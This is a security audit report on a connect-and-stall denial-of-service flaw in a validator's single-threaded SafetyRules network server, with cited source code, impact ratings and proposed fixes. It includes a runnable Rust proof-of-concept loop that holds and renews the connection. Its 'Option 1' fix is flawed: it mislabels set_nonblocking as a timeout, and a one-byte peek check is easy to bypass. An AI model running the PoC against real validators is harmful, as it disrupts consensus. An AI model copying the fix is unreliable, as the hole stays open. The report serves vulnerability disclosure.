# Audit Report

## Title
Accept-and-Stall Denial of Service in SafetyRules Remote Service

## Summary
The `NetworkServer` implementation contains a single-threaded blocking architecture that allows an attacker to monopolize the server's single connection slot by connecting without sending data. This prevents legitimate clients from accessing the SafetyRules service during the timeout period (default 30 seconds), and can be repeated indefinitely to achieve sustained denial of service against validator consensus participation.

## Finding Description

The `NetworkServer::client()` method implements a single-connection-at-a-time server model. [1](#0-0) 

The vulnerability occurs through the following mechanism:

1. The server only accepts new connections when `self.stream.is_none()` (line 366)
2. When a connection is accepted via `listener.accept()` (line 376), it is immediately stored in `self.stream` (line 400)
3. The server then attempts to read from this connection in the message processing loop [2](#0-1) 
4. The read operation blocks with a timeout [3](#0-2) 
5. If the attacker never sends data, the read blocks for the entire timeout period (default 30 seconds) [4](#0-3) 
6. Only after timeout does the server drop the connection and accept a new one [5](#0-4) 

**Attack Flow:**
- Attacker connects to SafetyRules remote service endpoint
- Connection accepted, stored as the single active stream
- Attacker sends no data, causing 30-second read timeout
- During this window, legitimate validator clients cannot connect
- After timeout, attacker immediately reconnects
- Repeat for sustained DoS

This breaks the **Consensus Liveness** invariant - validators cannot participate in consensus without access to SafetyRules, which validates blocks and prevents double-signing.

**Scope Limitation:** 
Mainnet validators are protected by configuration validation that enforces Local mode [6](#0-5) . However, testnets, development environments, and any deployment using `SafetyRulesService::Process` remain vulnerable.

## Impact Explanation

**High Severity** - Validator node slowdowns and consensus participation denial.

For deployments using Process mode (testnet/devnet):
- Validator cannot access SafetyRules during attack windows
- Cannot validate new blocks or vote on proposals
- Degrades to a non-participating validator
- Multiple affected validators could impact network liveness
- No funds are directly at risk, but consensus availability is compromised

This falls under the "Validator node slowdowns" category (High Severity, up to $50,000) and impacts "Significant protocol violations" through consensus participation denial.

## Likelihood Explanation

**High likelihood** for vulnerable deployments:

**Attack Complexity:** Trivial - requires only TCP connection without authentication
**Attacker Requirements:** Network access to SafetyRules service port
**Automation:** Easily scripted for sustained attack
**Detection:** Difficult - appears as legitimate connection attempts in logs
**Cost:** Negligible - just network bandwidth for connection establishment

The attack can be automated to reconnect immediately after each timeout, creating sustained DoS with minimal resources.

## Recommendation

Implement one of the following mitigations:

**Option 1: Connection timeout on accept (Immediate)**
Add a connection establishment timeout before storing in `self.stream`:

```rust
fn client(&mut self) -> Result<&mut NetworkStream, Error> {
    if self.stream.is_none() {
        // ... existing logging ...
        let listener = self.listener.as_mut().ok_or(Error::AlreadyShutdown)?;
        
        // Set accept timeout to prevent blocking indefinitely
        listener.set_nonblocking(false)?;
        
        let (stream, stream_addr) = match listener.accept() {
            Ok(ok) => ok,
            Err(err) => { /* ... */ }
        };
        
        stream.set_nodelay(true)?;
        
        // Immediately try to peek data to verify client is sending
        let mut peek_buf = [0u8; 1];
        stream.set_read_timeout(Some(Duration::from_millis(1000)))?;
        if stream.peek(&mut peek_buf).is_err() {
            // Connection with no immediate data - reject
            return Err(Error::RemoteStreamClosed);
        }
        
        self.stream = Some(NetworkStream::new(stream, stream_addr, self.timeout_ms));
    }
    self.stream.as_mut().ok_or(Error::NoActiveStream)
}
```

**Option 2: Multi-threaded server (Robust)**
Replace single-threaded model with thread-per-connection or async model to handle multiple clients simultaneously.

**Option 3: Connection limiting (Defense-in-depth)**
Add connection rate limiting and maximum retry counts per source IP.

**Recommended:** Implement Option 1 immediately for backward compatibility, then migrate to Option 2 for production-grade robustness.

## Proof of Concept

```rust
// PoC: Connect and stall attack against SafetyRules service
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn main() {
    let safety_rules_addr = "127.0.0.1:6543"; // Example SafetyRules endpoint
    
    loop {
        println!("[+] Connecting to SafetyRules service...");
        match TcpStream::connect(safety_rules_addr) {
            Ok(stream) => {
                println!("[+] Connected! Holding connection without sending data...");
                // Don't send any data - just hold the connection
                // The server will block for 30 seconds waiting for data
                thread::sleep(Duration::from_secs(35)); // Wait past timeout
                drop(stream);
                println!("[+] Connection timed out, reconnecting immediately...");
                // Immediately reconnect to maintain DoS
                thread::sleep(Duration::from_millis(100));
            }
            Err(e) => {
                println!("[-] Connection failed: {}", e);
                thread::sleep(Duration::from_secs(1));
            }
        }
    }
}
```

**To test:**
1. Configure a validator with `SafetyRulesService::Process` mode
2. Run the PoC script pointing to the SafetyRules endpoint
3. Attempt to use the validator's SafetyRules from legitimate client
4. Observe that legitimate client cannot connect during attack window
5. Monitor validator - it cannot participate in consensus during attack

## Notes

While mainnet deployments are protected by configuration enforcement requiring Local mode, this vulnerability represents a significant security risk for:
- Testnet validators
- Development/staging environments  
- Any custom deployments using Process mode

The single-threaded blocking architecture is fundamentally incompatible with untrusted network exposure. Even with the immediate mitigations suggested, production deployments should use Local mode for SafetyRules to avoid network attack surface entirely.

### Citations

**File:** secure/net/src/lib.rs (L297-321)
```rust
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        self.increment_counter(Method::Read, MethodResult::Query);

        let result = {
            let stream = self.client()?;
            stream.read().map_err(|e| (stream.remote, e))
        };

        if let Err((remote, err)) = &result {
            self.increment_counter(Method::Read, MethodResult::Failure);
            warn!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::DisconnectedPeerOnRead,
            )
            .error(err)
            .remote_peer(remote));

            self.stream = None;
        } else {
            self.increment_counter(Method::Read, MethodResult::Success);
        }

        result.map_err(|err| err.1)
    }
```

**File:** secure/net/src/lib.rs (L365-404)
```rust
    fn client(&mut self) -> Result<&mut NetworkStream, Error> {
        if self.stream.is_none() {
            self.increment_counter(Method::Connect, MethodResult::Query);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionAttempt,
            ));

            let listener = self.listener.as_mut().ok_or(Error::AlreadyShutdown)?;

            let (stream, stream_addr) = match listener.accept() {
                Ok(ok) => ok,
                Err(err) => {
                    self.increment_counter(Method::Connect, MethodResult::Failure);
                    let err = err.into();
                    warn!(SecureNetLogSchema::new(
                        &self.service,
                        NetworkMode::Server,
                        LogEvent::ConnectionSuccessful,
                    )
                    .error(&err));
                    return Err(err);
                },
            };

            self.increment_counter(Method::Connect, MethodResult::Success);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionSuccessful,
            )
            .remote_peer(&stream_addr));

            stream.set_nodelay(true)?;
            self.stream = Some(NetworkStream::new(stream, stream_addr, self.timeout_ms));
        }

        self.stream.as_mut().ok_or(Error::NoActiveStream)
    }
```

**File:** secure/net/src/lib.rs (L414-451)
```rust
impl NetworkStream {
    pub fn new(stream: TcpStream, remote: SocketAddr, timeout_ms: u64) -> Self {
        let timeout = Some(std::time::Duration::from_millis(timeout_ms));
        // These only fail if a duration of 0 is passed in.
        stream.set_read_timeout(timeout).unwrap();
        stream.set_write_timeout(timeout).unwrap();

        Self {
            stream,
            remote,
            buffer: Vec::new(),
            temp_buffer: [0; 1024],
        }
    }

    /// Blocking read until able to successfully read an entire message
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        let result = self.read_buffer();
        if !result.is_empty() {
            return Ok(result);
        }

        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L40-45)
```rust
    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}
```

**File:** config/src/config/safety_rules_config.rs (L43-44)
```rust
            // Default value of 30 seconds for a timeout
            network_timeout_ms: 30_000,
```

**File:** config/src/config/safety_rules_config.rs (L99-104)
```rust
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```
